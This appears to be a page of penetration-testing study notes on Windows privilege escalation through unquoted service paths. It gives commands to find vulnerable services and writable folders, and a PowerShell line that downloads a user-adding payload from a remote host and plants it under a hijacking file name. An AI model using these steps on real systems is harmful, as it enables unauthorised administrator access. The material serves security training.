# Unquoted service paths

An example of an unquoted service binary path is **C:\Program Files\My Program\My Service\service.exe**. When Windows starts the service, it will use the following order to try to start the executable file due to the spaces in the path.

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

_<mark style="background-color:purple;">**identify unquoted service paths**</mark>_\
enumerate running and stopped services:

{% code overflow="wrap" %}
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
{% endcode %}

more <mark style="color:green;">effective</mark> way to identify spaces in the paths and missing quotes:

{% code overflow="wrap" %}
```shell
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
{% endcode %}

* `findstr /i /v "C:\Windows\\"` - only services with a binary path outside of the Windows directory.
* `findstr /i /v """` - print only matches without quotes

_<mark style="background-color:purple;">**check we can start and stop the service**</mark>_

```powershell
Start-Service GammaService
Stop-Service GammaService
```

_<mark style="background-color:purple;">**check access rights for file paths**</mark>_\
check access rights for every location based on the unquoted service path and its paths Windows uses to attempt locating the executable file of the service.

* check for one with write access (unlikely the first 2 as restricted privs)

```powershell
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

_<mark style="background-color:purple;">**create malicious executable**</mark>_\
use [adduser.exe](https://oscp-26.gitbook.io/oscp-notes/windows-priv-esc/service-binary-hijacking#exploit-service-binaries), msfvenom

_<mark style="background-color:purple;">**install executable in path with write privs**</mark>_\
name executable based on unquoted file path\
&#xNAN;_&#x65;.g if full file path is C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe and C:\Program Files\Enterprise App is writeable then the executable should be named Current.exe_&#x20;

```powershell
iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe
```
